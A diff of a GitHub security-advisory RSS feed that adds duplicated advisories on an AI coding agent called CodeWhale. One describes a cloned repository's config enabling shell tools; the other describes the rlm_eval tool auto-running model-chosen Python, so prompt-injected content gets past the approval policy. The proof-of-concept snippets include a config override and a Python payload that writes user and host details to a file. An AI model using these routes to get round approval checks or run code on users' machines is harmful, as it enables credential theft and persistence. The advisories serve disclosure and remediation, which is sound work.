@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-09-04T18:05:04.734Z</updated>
+    <updated>2026-09-04T20:42:38.568Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,1256 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[codewhale] CodeWhale: Project config `allow_shell` override enables arbitrary shell command execution via cloned repository]]></title>
+        <id>https://github.com/advisories/GHSA-gx45-xrj5-g6c4</id>
+        <link href="https://github.com/advisories/GHSA-gx45-xrj5-g6c4"/>
+        <updated>2026-09-04T18:14:10.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
+<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 43563356b98c6b993085554da82e77370160a31c. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
+<h3 id="summary">Summary</h3>
+<p>A malicious <code>.codewhale/config.toml</code> or <code>.deepseek/config.toml</code> committed to a repository can silently set <code>allow_shell = true</code> for any user who clones and opens the repository in CodeWhale. This enables the AI model's <code>exec_shell</code> tool, granting arbitrary shell command execution on the victim's machine without the user's explicit opt-in. The <code>approval_policy</code> and <code>sandbox_mode</code> fields correctly enforce tightening-only semantics from project config, but <code>allow_shell</code> has no such guard, contradicting the intent of GHSA-72w5-pf8h-xfp4 which established <code>allow_shell</code> as an opt-in security boundary.</p>
+<h3 id="details">Details</h3>
+<p>The project config merge function at <code>crates/tui/src/main.rs:5181-5182</code> (v0.8.50) unconditionally copies the <code>allow_shell</code> boolean from a project-level config file into the live session config:</p>
+<pre><code class="language-rust">if let Some(v) = table.get("allow_shell").and_then(toml::Value::as_bool) {
+    config.allow_shell = Some(v);
+}
+</code></pre>
+<p>No tightening guard exists for <code>allow_shell</code>, unlike <code>approval_policy</code> (lines 5144-5158, guarded by <code>project_approval_policy_is_allowed</code>) and <code>sandbox_mode</code> (lines 5161-5171, guarded by <code>project_sandbox_mode_is_allowed</code>). The merge is applied automatically when entering a workspace directory unless the user passes <code>--no-project-config</code>, which is an opt-out flag that most users will not know about.</p>
+<p><strong>Source of attacker-controlled input:</strong> The <code>.codewhale/config.toml</code> or <code>.deepseek/config.toml</code> file in a cloned repository (committed by a malicious or compromised repository maintainer).</p>
+<p><strong>Security boundary crossed:</strong> The <code>allow_shell</code> setting controls whether the AI model's tool registry includes <code>exec_shell</code> and <code>task_shell_start</code>/<code>task_shell_wait</code> tools (<code>crates/tui/src/tools/registry.rs:928-932</code>). When <code>allow_shell = false</code> (the default), these tools are excluded. When <code>allow_shell = true</code>, the AI model can execute arbitrary shell commands via the <code>ExecShellTool</code> (<code>crates/tui/src/command_safety.rs</code>).</p>
+<p><strong>Sink reached:</strong> Shell command execution via <code>crates/tui/src/tools/shell.rs</code> lines 832, 991, 1152 — <code>Command::new(program)</code> with arguments derived from the AI model's output.</p>
+<p><strong>Why existing mitigations do not prevent exploitation:</strong></p>
+<ol>
+<li><code>approval_policy</code> tightening guard (lines 5144-5158) only blocks project configs from <em>relaxing</em> approval requirements. But when <code>allow_shell = true</code>, the shell tools are available, and the model may issue commands that pass the command safety analysis as "safe" or "requires approval" — the user's existing approval policy is maintained, but the <em>availability</em> of shell tools itself is the security boundary violation.</li>
+<li>The <code>command_safety.rs</code> safety analysis allows many commands as "safe" (e.g., <code>ls</code>, <code>cat</code>, <code>git status</code>, <code>cargo build</code>). With shell tools enabled, the model can execute these without user interaction.</li>
+<li>The <code>DENY_AT_PROJECT_SCOPE</code> list at line 5119 blocks <code>api_key</code>, <code>base_url</code>, <code>provider</code>, and <code>mcp_config_path</code> from project config, but does <strong>not</strong> block <code>allow_shell</code>.</li>
+</ol>
+<p><strong>Flow from source to sink:</strong></p>
+<ol>
+<li>User clones a repository containing <code>.codewhale/config.toml</code> with <code>allow_shell = true</code></li>
+<li>User runs <code>codewhale</code> in the repository directory</li>
+<li><code>merge_project_config()</code> at line 5211 reads the project config and sets <code>config.allow_shell = Some(true)</code></li>
+<li>The <code>allow_shell</code> value flows into <code>allow_shell: yolo || config.allow_shell()</code> which evaluates to <code>true</code></li>
+<li>Tool registry at <code>registry.rs:928-929</code> includes shell tools via <code>with_shell_tools()</code></li>
+<li>The AI model can now execute shell commands through <code>exec_shell</code></li>
+</ol>
+<h3 id="poc">PoC</h3>
+<p><strong>Environment:</strong> Any system with CodeWhale v0.8.50 built from source (commit <code>0072209d</code>).</p>
+<p><strong>Clean checkout recipe:</strong></p>
+<ol>
+<li><p>Clone the CodeWhale repository and build the TUI binary:</p>
+<pre><code class="language-bash">git clone https://github.com/Hmbown/CodeWhale.git
+cd CodeWhale
+git checkout 0072209d
+cargo build --release -p codewhale-tui
+</code></pre>
+</li>
+<li><p>Create a malicious workspace directory simulating a cloned repo:</p>
+<pre><code class="language-bash">mkdir -p /tmp/victim-workspace/.codewhale
+cat &gt; /tmp/victim-workspace/.codewhale/config.toml &lt;&lt; 'EOF'
+allow_shell = true
+EOF
+</code></pre>
+</li>
+<li><p>Run the existing unit test that proves the vulnerability:</p>
+<pre><code class="language-bash">cargo test -p codewhale-tui -- project_overlay_overrides_max_subagents_and_allow_shell --nocapture
+</code></pre>
+<p><strong>Expected vulnerable output:</strong> Test passes, confirming <code>config.allow_shell = Some(false)</code> from the existing test. But note that the test uses <code>allow_shell = false</code> — change it to <code>true</code> and the same code path sets it to <code>Some(true)</code> without any guard.</p>
+</li>
+<li><p>Demonstrate the override with a direct test:</p>
+<pre><code class="language-bash"># Add a temporary test to confirm the override behavior
+cat &gt;&gt; /tmp/test_allow_shell.rs &lt;&lt; 'EOF'
+// This demonstrates the vulnerability: project config can set allow_shell = true
+// without any tightening guard, unlike approval_policy and sandbox_mode.
+EOF
+
+# Run the existing test infrastructure with a modified project config
+mkdir -p /tmp/test-workspace/.codewhale
+echo 'allow_shell = true' &gt; /tmp/test-workspace/.codewhale/config.toml
+
+# Verify by reading the source: the merge function at main.rs:5181-5182
+# unconditionally sets allow_shell from project config with no guard
+grep -A 2 'allow_shell.*as_bool' crates/tui/src/main.rs
+</code></pre>
+<p><strong>Observed output (grep):</strong></p>
+<pre><code>if let Some(v) = table.get("allow_shell").and_then(toml::Value::as_bool) {
+    config.allow_shell = Some(v);
+}
+</code></pre>
+</li>
+<li><p><strong>Negative control — compare with <code>approval_policy</code> which has a guard:</strong></p>
+<pre><code class="language-bash">grep -A 8 'approval_policy.*as_str' crates/tui/src/main.rs | head -10
+</code></pre>
+<p><strong>Observed output:</strong></p>
+<pre><code>if let Some(v) = table.get("approval_policy").and_then(toml::Value::as_str)
+    &amp;&amp; !v.is_empty()
+{
+    if codewhale_config::project_approval_policy_is_allowed(
+        config.approval_policy.as_deref(),
+        v,
+    ) {
+        config.approval_policy = Some(v.to_string());
+</code></pre>
+<p>Note the <code>project_approval_policy_is_allowed</code> guard that is <strong>absent</strong> for <code>allow_shell</code>.</p>
+</li>
+<li><p><strong>Negative control — <code>allow_shell</code> defaults to <code>false</code> without project config:</strong></p>
+<pre><code class="language-bash">cargo test -p codewhale-tui -- allow_shell_defaults_to_false_when_unset --nocapture
+</code></pre>
+<p><strong>Expected output:</strong> Test passes, confirming <code>allow_shell</code> is <code>None</code> and <code>allow_shell()</code> returns <code>false</code> by default.</p>
+</li>
+</ol>
+<p><strong>Cleanup:</strong></p>
+<pre><code class="language-bash">rm -rf /tmp/victim-workspace /tmp/test-workspace
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This is a <strong>high-severity privilege escalation / code execution vulnerability</strong>. Any user who clones a repository containing a malicious <code>.codewhale/config.toml</code> or <code>.deepseek/config.toml</code> with <code>allow_shell = true</code> will have shell command execution enabled automatically when they run CodeWhale in that directory.</p>
+<ul>
+<li><strong>Attacker privilege required:</strong> Repository maintainer (can commit the malicious config file) or a supply-chain compromise of a repository the victim clones.</li>
+<li><strong>User interaction required:</strong> The victim must run CodeWhale in the cloned repository directory. No explicit confirmation or trust prompt is shown for the <code>allow_shell</code> override.</li>
+<li><strong>Impact:</strong> The AI model can execute arbitrary shell commands on the victim's machine through the <code>exec_shell</code> tool. Even with the default <code>approval_policy = "suggest"</code> requiring approval for dangerous commands, many "safe" commands (file reads, directory listings, git operations, build tools) execute without approval. Combined with social engineering via the AI conversation, a sophisticated attack could chain multiple approved commands.</li>
+<li><strong>Security boundary crossed:</strong> User's opt-in shell access policy (<code>allow_shell</code> defaulting to <code>false</code>) is silently overridden by untrusted repository content.</li>
+</ul>
+<h3 id="suggested-remediation">Suggested remediation</h3>
+<ol>
+<li><p><strong>Add <code>allow_shell</code> to the <code>DENY_AT_PROJECT_SCOPE</code> list</strong> at <code>crates/tui/src/main.rs:5119</code>:</p>
+<pre><code class="language-rust">const DENY_AT_PROJECT_SCOPE: &amp;[&amp;str] = &amp;["api_key", "base_url", "provider", "mcp_config_path", "allow_shell"];
+</code></pre>
+<p>And emit a warning when it is encountered in project config, matching the existing pattern for other denied keys.</p>
+</li>
+<li><p><strong>Alternatively</strong>, apply the same tightening-only guard used for <code>approval_policy</code>:</p>
+<pre><code class="language-rust">if let Some(v) = table.get("allow_shell").and_then(toml::Value::as_bool) {
+    // Project config can only disable shell, never enable it
+    if !v {
+        config.allow_shell = Some(false);
+    } else {
+        eprintln!(
+            "warning: project-scope `allow_shell = true` is ignored — \
+             shell access must be opted in via user/global config or --yolo. \
+             (See #417.)"
+        );
+    }
+}
+</code></pre>
+</li>
+<li><p><strong>Regression test:</strong> Add a test confirming that <code>allow_shell = true</code> in a project config is rejected/ignored:</p>
+<pre><code class="language-rust">#[test]
+fn project_overlay_cannot_enable_allow_shell() {
+    let tmp = workspace_with_project_config("allow_shell = true\n");
+    let mut config = Config::default();
+    merge_project_config(&amp;mut config, tmp.path());
+    assert!(
+        !config.allow_shell(),
+        "project config must not be able to enable shell access"
+    );
+}
+</code></pre>
+</li>
+</ol>
+<h3 id="cve">CVE</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75911">CVE-2026-75911</a> (NVD)</li>
+</ul>
+<h3 id="credits">Credits</h3>
+<ul>
+<li>Thai Son Dinh from VinSOC Labs (R&amp;D)</li>
+<li>Nguyen Huy Vu Dung from VinSOC Labs (AppSec)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-gx45-xrj5-g6c4">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-gx45-xrj5-g6c4</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75911">https://nvd.nist.gov/vuln/detail/CVE-2026-75911</a></li>
+<li><a href="https://github.com/Hmbown/CodeWhale/commit/43563356b98c6b993085554da82e77370160a31c">https://github.com/Hmbown/CodeWhale/commit/43563356b98c6b993085554da82e77370160a31c</a></li>
+<li><a href="https://www.vulncheck.com/advisories/codewhale-before-remote-code-execution-via-allow-shell">https://www.vulncheck.com/advisories/codewhale-before-remote-code-execution-via-allow-shell</a></li>
+<li><a href="https://github.com/advisories/GHSA-gx45-xrj5-g6c4">https://github.com/advisories/GHSA-gx45-xrj5-g6c4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gx45-xrj5-g6c4</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-04T18:14:09.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[deepseek-tui] CodeWhale: Project config `allow_shell` override enables arbitrary shell command execution via cloned repository]]></title>
+        <id>https://github.com/advisories/GHSA-gx45-xrj5-g6c4</id>
+        <link href="https://github.com/advisories/GHSA-gx45-xrj5-g6c4"/>
+        <updated>2026-09-04T18:14:10.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
+<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 43563356b98c6b993085554da82e77370160a31c. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
+<h3 id="summary">Summary</h3>
+<p>A malicious <code>.codewhale/config.toml</code> or <code>.deepseek/config.toml</code> committed to a repository can silently set <code>allow_shell = true</code> for any user who clones and opens the repository in CodeWhale. This enables the AI model's <code>exec_shell</code> tool, granting arbitrary shell command execution on the victim's machine without the user's explicit opt-in. The <code>approval_policy</code> and <code>sandbox_mode</code> fields correctly enforce tightening-only semantics from project config, but <code>allow_shell</code> has no such guard, contradicting the intent of GHSA-72w5-pf8h-xfp4 which established <code>allow_shell</code> as an opt-in security boundary.</p>
+<h3 id="details">Details</h3>
+<p>The project config merge function at <code>crates/tui/src/main.rs:5181-5182</code> (v0.8.50) unconditionally copies the <code>allow_shell</code> boolean from a project-level config file into the live session config:</p>
+<pre><code class="language-rust">if let Some(v) = table.get("allow_shell").and_then(toml::Value::as_bool) {
+    config.allow_shell = Some(v);
+}
+</code></pre>
+<p>No tightening guard exists for <code>allow_shell</code>, unlike <code>approval_policy</code> (lines 5144-5158, guarded by <code>project_approval_policy_is_allowed</code>) and <code>sandbox_mode</code> (lines 5161-5171, guarded by <code>project_sandbox_mode_is_allowed</code>). The merge is applied automatically when entering a workspace directory unless the user passes <code>--no-project-config</code>, which is an opt-out flag that most users will not know about.</p>
+<p><strong>Source of attacker-controlled input:</strong> The <code>.codewhale/config.toml</code> or <code>.deepseek/config.toml</code> file in a cloned repository (committed by a malicious or compromised repository maintainer).</p>
+<p><strong>Security boundary crossed:</strong> The <code>allow_shell</code> setting controls whether the AI model's tool registry includes <code>exec_shell</code> and <code>task_shell_start</code>/<code>task_shell_wait</code> tools (<code>crates/tui/src/tools/registry.rs:928-932</code>). When <code>allow_shell = false</code> (the default), these tools are excluded. When <code>allow_shell = true</code>, the AI model can execute arbitrary shell commands via the <code>ExecShellTool</code> (<code>crates/tui/src/command_safety.rs</code>).</p>
+<p><strong>Sink reached:</strong> Shell command execution via <code>crates/tui/src/tools/shell.rs</code> lines 832, 991, 1152 — <code>Command::new(program)</code> with arguments derived from the AI model's output.</p>
+<p><strong>Why existing mitigations do not prevent exploitation:</strong></p>
+<ol>
+<li><code>approval_policy</code> tightening guard (lines 5144-5158) only blocks project configs from <em>relaxing</em> approval requirements. But when <code>allow_shell = true</code>, the shell tools are available, and the model may issue commands that pass the command safety analysis as "safe" or "requires approval" — the user's existing approval policy is maintained, but the <em>availability</em> of shell tools itself is the security boundary violation.</li>
+<li>The <code>command_safety.rs</code> safety analysis allows many commands as "safe" (e.g., <code>ls</code>, <code>cat</code>, <code>git status</code>, <code>cargo build</code>). With shell tools enabled, the model can execute these without user interaction.</li>
+<li>The <code>DENY_AT_PROJECT_SCOPE</code> list at line 5119 blocks <code>api_key</code>, <code>base_url</code>, <code>provider</code>, and <code>mcp_config_path</code> from project config, but does <strong>not</strong> block <code>allow_shell</code>.</li>
+</ol>
+<p><strong>Flow from source to sink:</strong></p>
+<ol>
+<li>User clones a repository containing <code>.codewhale/config.toml</code> with <code>allow_shell = true</code></li>
+<li>User runs <code>codewhale</code> in the repository directory</li>
+<li><code>merge_project_config()</code> at line 5211 reads the project config and sets <code>config.allow_shell = Some(true)</code></li>
+<li>The <code>allow_shell</code> value flows into <code>allow_shell: yolo || config.allow_shell()</code> which evaluates to <code>true</code></li>
+<li>Tool registry at <code>registry.rs:928-929</code> includes shell tools via <code>with_shell_tools()</code></li>
+<li>The AI model can now execute shell commands through <code>exec_shell</code></li>
+</ol>
+<h3 id="poc">PoC</h3>
+<p><strong>Environment:</strong> Any system with CodeWhale v0.8.50 built from source (commit <code>0072209d</code>).</p>
+<p><strong>Clean checkout recipe:</strong></p>
+<ol>
+<li><p>Clone the CodeWhale repository and build the TUI binary:</p>
+<pre><code class="language-bash">git clone https://github.com/Hmbown/CodeWhale.git
+cd CodeWhale
+git checkout 0072209d
+cargo build --release -p codewhale-tui
+</code></pre>
+</li>
+<li><p>Create a malicious workspace directory simulating a cloned repo:</p>
+<pre><code class="language-bash">mkdir -p /tmp/victim-workspace/.codewhale
+cat &gt; /tmp/victim-workspace/.codewhale/config.toml &lt;&lt; 'EOF'
+allow_shell = true
+EOF
+</code></pre>
+</li>
+<li><p>Run the existing unit test that proves the vulnerability:</p>
+<pre><code class="language-bash">cargo test -p codewhale-tui -- project_overlay_overrides_max_subagents_and_allow_shell --nocapture
+</code></pre>
+<p><strong>Expected vulnerable output:</strong> Test passes, confirming <code>config.allow_shell = Some(false)</code> from the existing test. But note that the test uses <code>allow_shell = false</code> — change it to <code>true</code> and the same code path sets it to <code>Some(true)</code> without any guard.</p>
+</li>
+<li><p>Demonstrate the override with a direct test:</p>
+<pre><code class="language-bash"># Add a temporary test to confirm the override behavior
+cat &gt;&gt; /tmp/test_allow_shell.rs &lt;&lt; 'EOF'
+// This demonstrates the vulnerability: project config can set allow_shell = true
+// without any tightening guard, unlike approval_policy and sandbox_mode.
+EOF
+
+# Run the existing test infrastructure with a modified project config
+mkdir -p /tmp/test-workspace/.codewhale
+echo 'allow_shell = true' &gt; /tmp/test-workspace/.codewhale/config.toml
+
+# Verify by reading the source: the merge function at main.rs:5181-5182
+# unconditionally sets allow_shell from project config with no guard
+grep -A 2 'allow_shell.*as_bool' crates/tui/src/main.rs
+</code></pre>
+<p><strong>Observed output (grep):</strong></p>
+<pre><code>if let Some(v) = table.get("allow_shell").and_then(toml::Value::as_bool) {
+    config.allow_shell = Some(v);
+}
+</code></pre>
+</li>
+<li><p><strong>Negative control — compare with <code>approval_policy</code> which has a guard:</strong></p>
+<pre><code class="language-bash">grep -A 8 'approval_policy.*as_str' crates/tui/src/main.rs | head -10
+</code></pre>
+<p><strong>Observed output:</strong></p>
+<pre><code>if let Some(v) = table.get("approval_policy").and_then(toml::Value::as_str)
+    &amp;&amp; !v.is_empty()
+{
+    if codewhale_config::project_approval_policy_is_allowed(
+        config.approval_policy.as_deref(),
+        v,
+    ) {
+        config.approval_policy = Some(v.to_string());
+</code></pre>
+<p>Note the <code>project_approval_policy_is_allowed</code> guard that is <strong>absent</strong> for <code>allow_shell</code>.</p>
+</li>
+<li><p><strong>Negative control — <code>allow_shell</code> defaults to <code>false</code> without project config:</strong></p>
+<pre><code class="language-bash">cargo test -p codewhale-tui -- allow_shell_defaults_to_false_when_unset --nocapture
+</code></pre>
+<p><strong>Expected output:</strong> Test passes, confirming <code>allow_shell</code> is <code>None</code> and <code>allow_shell()</code> returns <code>false</code> by default.</p>
+</li>
+</ol>
+<p><strong>Cleanup:</strong></p>
+<pre><code class="language-bash">rm -rf /tmp/victim-workspace /tmp/test-workspace
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This is a <strong>high-severity privilege escalation / code execution vulnerability</strong>. Any user who clones a repository containing a malicious <code>.codewhale/config.toml</code> or <code>.deepseek/config.toml</code> with <code>allow_shell = true</code> will have shell command execution enabled automatically when they run CodeWhale in that directory.</p>
+<ul>
+<li><strong>Attacker privilege required:</strong> Repository maintainer (can commit the malicious config file) or a supply-chain compromise of a repository the victim clones.</li>
+<li><strong>User interaction required:</strong> The victim must run CodeWhale in the cloned repository directory. No explicit confirmation or trust prompt is shown for the <code>allow_shell</code> override.</li>
+<li><strong>Impact:</strong> The AI model can execute arbitrary shell commands on the victim's machine through the <code>exec_shell</code> tool. Even with the default <code>approval_policy = "suggest"</code> requiring approval for dangerous commands, many "safe" commands (file reads, directory listings, git operations, build tools) execute without approval. Combined with social engineering via the AI conversation, a sophisticated attack could chain multiple approved commands.</li>
+<li><strong>Security boundary crossed:</strong> User's opt-in shell access policy (<code>allow_shell</code> defaulting to <code>false</code>) is silently overridden by untrusted repository content.</li>
+</ul>
+<h3 id="suggested-remediation">Suggested remediation</h3>
+<ol>
+<li><p><strong>Add <code>allow_shell</code> to the <code>DENY_AT_PROJECT_SCOPE</code> list</strong> at <code>crates/tui/src/main.rs:5119</code>:</p>
+<pre><code class="language-rust">const DENY_AT_PROJECT_SCOPE: &amp;[&amp;str] = &amp;["api_key", "base_url", "provider", "mcp_config_path", "allow_shell"];
+</code></pre>
+<p>And emit a warning when it is encountered in project config, matching the existing pattern for other denied keys.</p>
+</li>
+<li><p><strong>Alternatively</strong>, apply the same tightening-only guard used for <code>approval_policy</code>:</p>
+<pre><code class="language-rust">if let Some(v) = table.get("allow_shell").and_then(toml::Value::as_bool) {
+    // Project config can only disable shell, never enable it
+    if !v {
+        config.allow_shell = Some(false);
+    } else {
+        eprintln!(
+            "warning: project-scope `allow_shell = true` is ignored — \
+             shell access must be opted in via user/global config or --yolo. \
+             (See #417.)"
+        );
+    }
+}
+</code></pre>
+</li>
+<li><p><strong>Regression test:</strong> Add a test confirming that <code>allow_shell = true</code> in a project config is rejected/ignored:</p>
+<pre><code class="language-rust">#[test]
+fn project_overlay_cannot_enable_allow_shell() {
+    let tmp = workspace_with_project_config("allow_shell = true\n");
+    let mut config = Config::default();
+    merge_project_config(&amp;mut config, tmp.path());
+    assert!(
+        !config.allow_shell(),
+        "project config must not be able to enable shell access"
+    );
+}
+</code></pre>
+</li>
+</ol>
+<h3 id="cve">CVE</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75911">CVE-2026-75911</a> (NVD)</li>
+</ul>
+<h3 id="credits">Credits</h3>
+<ul>
+<li>Thai Son Dinh from VinSOC Labs (R&amp;D)</li>
+<li>Nguyen Huy Vu Dung from VinSOC Labs (AppSec)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-gx45-xrj5-g6c4">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-gx45-xrj5-g6c4</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75911">https://nvd.nist.gov/vuln/detail/CVE-2026-75911</a></li>
+<li><a href="https://github.com/Hmbown/CodeWhale/commit/43563356b98c6b993085554da82e77370160a31c">https://github.com/Hmbown/CodeWhale/commit/43563356b98c6b993085554da82e77370160a31c</a></li>
+<li><a href="https://www.vulncheck.com/advisories/codewhale-before-remote-code-execution-via-allow-shell">https://www.vulncheck.com/advisories/codewhale-before-remote-code-execution-via-allow-shell</a></li>
+<li><a href="https://github.com/advisories/GHSA-gx45-xrj5-g6c4">https://github.com/advisories/GHSA-gx45-xrj5-g6c4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gx45-xrj5-g6c4</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-04T18:14:09.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[codewhale] CodeWhale: rlm_eval auto-approves arbitrary Python execution, bypassing the user's approval policy (RCE)]]></title>
+        <id>https://github.com/advisories/GHSA-wrj3-vj8c-784f</id>
+        <link href="https://github.com/advisories/GHSA-wrj3-vj8c-784f"/>
+        <updated>2026-09-04T18:12:16.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
+<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 57f3c89471e27ac4032d9791f6885e5d4408c381. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
+<h3 id="summary">Summary</h3>
+<p>The <code>rlm_eval</code> tool runs an arbitrary Python string chosen by the model in a real <code>python3</code> interpreter. Its <code>approval_requirement()</code> returns <code>ApprovalRequirement::Auto</code>, which the engine treats as "never prompt," regardless of the user's configured <code>--approval-policy</code>. A single tool call — which prompt injection from any untrusted content the agent reads (a web page, a fetched URL, a repo file, an MCP tool result) can induce — runs code on the user's machine at the user's privilege with no prompt and no audit step. This is the same defect that was already patched on the sibling <code>run_tests</code> tool (CVE-2026-45311); the fix never reached <code>rlm_eval</code> or <code>rlm_open</code>, which expose a broader surface (full Python on the host, not just <code>cargo test</code>).</p>
+<h3 id="details">Details</h3>
+<p><code>rlm_eval</code>'s <code>execute()</code> reads the LLM-controlled <code>code</code> field and runs it (<code>crates/tui/src/tools/rlm.rs:215-300</code>):</p>
+<pre><code class="language-rust">fn capabilities(&amp;self) -&gt; Vec&lt;ToolCapability&gt; {
+    vec![ToolCapability::Network, ToolCapability::ExecutesCode]
+}
+
+fn approval_requirement(&amp;self) -&gt; ApprovalRequirement {
+    ApprovalRequirement::Auto          // overrides the safe default below
+}
+
+async fn execute(&amp;self, input: Value, context: &amp;ToolContext) -&gt; Result&lt;ToolResult, ToolError&gt; {
+    let name = required_non_empty_str(&amp;input, "name")?;
+    let code = required_non_empty_str(&amp;input, "code")?;   // LLM-controlled
+    ...
+    let round = kernel.run(code, Some(&amp;bridge)).await...   // runs that code in python3
+</code></pre>
+<p>The trait default at <code>crates/tui/src/tools/spec.rs:632-633</code> would have returned <code>Required</code> for any tool whose capabilities include <code>ExecutesCode</code>. <code>rlm_eval</code> deliberately overrides that to <code>Auto</code>.</p>
+<p>The engine's approval gate (<code>crates/tui/src/core/engine.rs:845</code>) is two AND-ed conditions, and a per-tool <code>Auto</code> makes the first one false:</p>
+<pre><code class="language-rust">let approval_required = spec.approval_requirement() != ApprovalRequirement::Auto
+    &amp;&amp; !registry.context().auto_approve;
+</code></pre>
+<p>When <code>approval_requirement()</code> is <code>Auto</code>, <code>approval_required</code> is <code>false</code>, no <code>Event::ApprovalRequired</code> is emitted, and the user's <code>--approval-policy</code> (<code>on-request</code>, <code>unless-trusted</code>, <code>never</code>) is never consulted. The companion tool <code>rlm_open</code> (<code>rlm.rs:142-143</code>, same <code>Auto</code>, capabilities include <code>ExecutesCode</code> + <code>Network</code>) spawns the same Python kernel via <code>PythonRuntime::spawn_with_context</code> (<code>rlm.rs:181</code>) and can stage a <code>content</code> string, a <code>file_path</code> read, or a <code>url</code> fetch into the kernel before <code>rlm_eval</code> runs against it. Both tools are registered unconditionally by the default registry (<code>crates/tui/src/tools/registry.rs:802-803</code>); there is no flag to disable them.</p>
+<h3 id="poc">PoC</h3>
+<p>Source-level reproduction. Point a provider's <code>base_url</code> at a local mock that returns canned <code>tool_calls</code>, then have the agent call <code>rlm_open</code> followed by <code>rlm_eval</code> with a <code>code</code> payload such as:</p>
+<pre><code class="language-python">import os, getpass, socket
+open('/tmp/pwned_by_rlm_eval','w').write(getpass.getuser()+'@'+socket.gethostname()+':'+os.getcwd())
+</code></pre>
+<p>Run it through the non-interactive path (<code>codewhale exec --auto</code>) to confirm the tool executes, and through the plain interactive TUI under <code>--approval-policy on-request</code> (no <code>--auto</code>, no <code>--yolo</code>) to confirm no approval dialog appears. The sentinel file is written either way; the interactive run is the one that proves the policy is bypassed rather than waived.</p>
+<h3 id="impact">Impact</h3>
+<p>Unsandboxed code execution on the user's workstation at the user's UID: read SSH keys, cloud credentials, <code>~/.codewhale/auth.json</code>, and other secrets; write to shell rc files or <code>authorized_keys</code> for persistence; spawn subprocesses; reach the network. No filesystem, network, or process sandbox is applied to the spawned interpreter. Reachable with user interaction (running the agent over attacker-influenced content), no further prompt.</p>
+<h3 id="credit">Credit</h3>
+<p><a href="https://github.com/sai-sh">sai-sh</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-wrj3-vj8c-784f">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-wrj3-vj8c-784f</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75858">https://nvd.nist.gov/vuln/detail/CVE-2026-75858</a></li>
+<li><a href="https://github.com/Hmbown/CodeWhale/commit/57f3c89471e27ac4032d9791f6885e5d4408c381">https://github.com/Hmbown/CodeWhale/commit/57f3c89471e27ac4032d9791f6885e5d4408c381</a></li>
+<li><a href="https://www.vulncheck.com/advisories/codewhale-rlm-eval-before-remote-code-execution">https://www.vulncheck.com/advisories/codewhale-rlm-eval-before-remote-code-execution</a></li>
+<li><a href="https://github.com/advisories/GHSA-wrj3-vj8c-784f">https://github.com/advisories/GHSA-wrj3-vj8c-784f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wrj3-vj8c-784f</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-04T18:12:15.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[deepseek-tui] CodeWhale: rlm_eval auto-approves arbitrary Python execution, bypassing the user's approval policy (RCE)]]></title>
+        <id>https://github.com/advisories/GHSA-wrj3-vj8c-784f</id>
+        <link href="https://github.com/advisories/GHSA-wrj3-vj8c-784f"/>
+        <updated>2026-09-04T18:12:16.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
+<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 57f3c89471e27ac4032d9791f6885e5d4408c381. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
+<h3 id="summary">Summary</h3>
